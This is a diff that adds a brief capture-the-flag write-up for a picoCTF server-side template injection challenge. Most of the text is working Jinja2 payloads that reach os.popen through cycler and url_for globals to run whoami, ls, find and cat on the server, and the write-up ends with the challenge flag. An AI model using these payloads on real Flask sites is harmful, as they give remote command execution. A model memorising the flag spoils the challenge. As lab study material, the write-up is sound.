@@ -1,0 +1,34 @@
+############step1##################
+you need to check if the site is php,or django
+
+{{ 7*7 }}
+
+this payload should return 49
+and you will find its jinja, flask python
+
+############step##################
+run
+{{ cycler.__init__.__globals__.os.popen('whoami').read() }}
+it will respond at ROOT meaning you the root
+
+run
+{{ cycler.__init__.__globals__.os.popen('ls /').read() }}
+ it will list all the files where we can see the challanges file 
+
+
+############step##################
+we try to locate the flag file using
+{{ url_for.__globals__['os'].popen('find / -name flag* 2>/dev/null').read() }}
+you get that it is located in the challange/flag 
+
+
+############FINDING THE FLAG##################
+run this to read the contents of the flag file
+
+{{ url_for.__globals__['os'].popen('cat /challenge/flag').read() }}
+
+############FLAG#################
+picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_ae48ad61}
+
+
+
